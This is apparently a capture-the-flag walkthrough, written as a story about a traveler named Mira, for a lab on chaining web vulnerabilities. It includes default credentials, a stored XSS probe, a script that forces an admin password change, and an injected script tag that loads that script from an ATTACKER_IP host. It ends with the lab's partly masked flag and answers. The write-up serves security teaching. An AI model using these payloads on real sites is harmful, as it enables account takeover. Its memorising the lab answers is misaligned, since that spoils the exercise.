# The Curious Traveler — Full Writeup for Chaining Vulnerabilities

In the bustling digital bazaar of *Valoria*, every merchant’s stall is a web application, and every traveler’s purse is a user account. Few notice the tiny cracks between wooden boards—until a cunning explorer threads her way through, one crack at a time, until she stands in the merchant’s private vault.

This is the tale of **Mira, the Curious Traveler**, and how she turned harmless quirks into a path straight to the vault door.

---

## Task 1: Preparing for the Journey

Mira eased herself into her camp, humming the familiar tune of exploration. Before any grand feat, she knew the importance of gear checks.

### Start Your Tools

* Boot up the AttackBox (or connect your VPN).
* Spin up the Target Machine on `10.10.177.6`.

### Gather Your Kit

* A browser for reconnaissance.
* A terminal for command-line spells.
* A text editor to scribe her cunning plans.

> “Every explorer knows that an unfinished map is an invitation to get lost,” she mused, checking her compass.

---

## Setting the Stage: The Philosophy of Chaining

*Vulnerability chaining* is the art of linking minor flaws—each innocuous alone—into a sequence that cracks open the whole system. It’s not about exploding the wall with one hit, but finding each loose brick, nudging it, and then lifting the entire barrier.

---

## Task 2: The Spark — Finding the First Loose Stone

In front of her lay the gate labeled **Login**. Many travelers stopped here, weary of strong passwords. Mira smiled.

### Try the Common Key

```bash
# Open the application in your browser:
http://10.10.177.6/
# Enter credentials:
Username: testuser
Password: password123
```

**Result**

She strolled right in. A simple test account remained by oversight—her first foothold.

---

## Task 3: Discovering the Hidden Window

Inside the courtyard of user features, Mira spotted a tiny painted window marked **Edit Profile**.

### Inspect the “Display Name” Field

#### Craft a Test Petard

```xml
<script>alert(1)</script>
```

**Outcome**

The alert bloomed like fireworks—this field reflected input without barriers. A **Stored XSS** crack had opened.

---

## Task 4: The Masterstroke — Turning the Whisper Into a Roar

The true vault, the **Admin Panel**, lay beyond a guarded door. Mira’s plan: whisper a command into the guard’s ear, and have him hand over the master key.

### Step 4.1: Forge the Whisper (Malicious Script)

On her AttackBox, Mira penned `script.js`:

```javascript
// script.js – The Whisper
fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=pwnedadmin@evil.local&password=pwnedadmin'
});
```

### Step 4.2: Host the Whisper

```bash
python3 -m http.server 8000
```

### Step 4.3: Bury the Whisper in the Window

Back on the target, she returned to **Edit Profile** and replaced her display name with:

```xml
<script src="http://ATTACKER_IP:8000/script.js"></script>
```

> Replace `ATTACKER_IP` with your AttackBox’s IP.

### Step 4.4: Await the Vault Guard

She monitored her server logs:

```bash
# Watch for the admin’s request for script.js
tail -f access.log
```

When she saw:

```
10.10.177.6 - - [18/Sep/2025 00:05:12] "GET /script.js HTTP/1.1" 200 -
```

she knew the guard had glanced through her window. The malicious `POST` had run, resetting the admin’s credentials.

### Step 4.5: Claim the Master Key

Mira navigated to the login portal again and entered:

```bash
# Browser:
http://10.10.177.6/

# Login form:
Username: admin
Password: pwnedadmin
```

The vault door swung open, revealing the coveted flag on a golden pedestal.

---

## Task 4 – Questions & Answers

**What is the flag in the admin panel?**

```
THM{57648b8e-3382-****-****-f125e128f8ab}
```

**What vulnerability enabled the attacker to force a change in the admin user’s password?**

> **Cross-Site Scripting** (Stored XSS)

---

## Task 5: Alternate Paths & Pivot Points

Real journeys twist and fork. If the guard’s door had CSRF tokens, Mira could have used her XSS to steal session cookies or trick him into other actions. Creative pivoting ensures no single roadblock ends the adventure.

---

## Task 6: Reflections & Lessons Learned

Holding the flag aloft, Mira reflected:

* Weak credentials opened a gate.
* Stored XSS cracked a window.
* Missing CSRF protection let her whisper unseen commands.
* Trust assumptions turned an admin glance into her triumph.

Alone, each flaw might have been dismissed. Together, they formed a path from the courtyard to the vault’s heart.

---

## Conclusion: The Explorer’s Creed

“Curiosity reveals hidden passages. Creativity turns small cracks into grand pathways.”

Approach every web application as Mira did: scout thoroughly, map vulnerabilities, connect them logically, and pivot when needed. In storytelling your chain, show the full journey—from low-risk footholds to full compromise—and you’ll illuminate the true impact of vulnerability chaining.
